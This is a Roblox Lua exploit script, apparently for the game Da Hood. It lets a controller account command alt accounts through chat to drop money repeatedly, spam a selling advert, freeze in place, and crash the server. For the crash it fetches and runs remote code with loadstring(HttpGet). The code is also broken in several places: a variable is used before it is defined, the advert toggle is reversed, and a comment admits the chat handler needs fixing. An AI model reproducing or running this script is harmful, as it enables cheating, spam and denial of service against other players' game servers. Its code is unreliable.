--CODE FOR ADITYAS (IH CONTROLLER) 

getgenv().potatopcheck = false
getgenv().advertt = false
getgenv().advert = "This is your advert, use it to advertise your DHC server while selling"
getgenv().ControllerID = 828591211
getgenv().dropconstant = false
getgenv().amountofalts = 1
getgenv().alts = {
    A1 = 1944337406,
    A2 = 854858585,
}


if plrid == ControllerID then
    local isaltcheck = true
end

local plrid = game.Players.LocalPlayer.UserId

--FUNCTIONS
wait(1)

local plr = game.Players.LocalPlayer

local controllername = game.Players:GetNameFromUserIdAsync(ControllerID)

local controllerplayer = game.Players[controllername]

local potatopccframe = CFrame.new(-1000, 1000, -1000000)





function amountgui() --passed
    loadstring(game:HttpGet('https://raw.githubusercontent.com/GS21Official/Seller-Tools/main/DaHood%20Cash%20Counter'))()
end

function block() -- passed
        if isaltcheck == false then
        local args = {
            [1] = "Block",
            [2] = true
        }

        game:GetService("ReplicatedStorage").MainEvent:FireServer(unpack(args))
    end
end

function walleth() --passed
    if isaltcheck == false then
    local wallet = game.Players.LocalPlayer.Backpack:FindFirstChild("Wallet")
    if wallet then
        wallet.Parent = game.Players.LocalPlayer.Character
        end
    end
end

function advertsend() --passed
    if isaltcheck == false then
    spawn(function()
        while advertt == true do
                if advertt == false then break else
                    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(advert, 'All');
                    wait(3)
                end
            end
        end)
    end
end


function drop() --passed
    spawn(function()
        while dropconstant == true do
            local args = {
                [1] = "DropMoney",
                [2] = "10000",
            }

            game:GetService("ReplicatedStorage").MainEvent:FireServer(unpack(args))
        end
    end)
end


function CheckIfController(id) --passed

    if game.Players.LocalPlayer.UserId == ControllerID then
        return true
    end
end

function potatopc(bool) --passed
    if bool then
        workspace.CurrentCamera.CameraType = "Scriptable"
        workspace.CurrentCamera.CFrame = potatopccframe
    end
end


function setupfunc() --passed
    local controllerpos = controllerplayer.Character.HumanoidRootPart.CFrame
        if controllerplayer then
        LocalPlayer.Character.HumanoidRootPart.CFrame = controllerpos + CFrame.new(0, 5, 0)
    end
end

function freeze() --passed
    if game.Players.LocalPlayer.UserId == ControllerID then return end
    
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 0

end

function swagmodecrash() --passed
    loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
end



--FUNCTION ENDS
wait(1)
--IF STATEMENTS

if game.Players.LocalPlayer.UserId == ControllerID then return end
    potatopc(potatopcheck)
end


controllerplayer.Chatted:Connect(function(msg)
    if msg == "drop" then 
        dropconstant = true
        drop()
    elseif msg == "setup" then
    setupfunc()

    elseif msg == "advert true" then
        getgenv().advertt = false
    elseif msg == "advert false" then
        getgenv().advertt = false
    elseif msg == "wallet" then
        walleth()
    elseif msg == "block" then
        block()
    elseif msg == "amount" then
        amountgui()
    elseif msg == "freeze" then
        freeze()
    elseif msg == "crash" then
        swagmodecrash()
    end
end)

--NEED TO FIX CHATTED EVENT
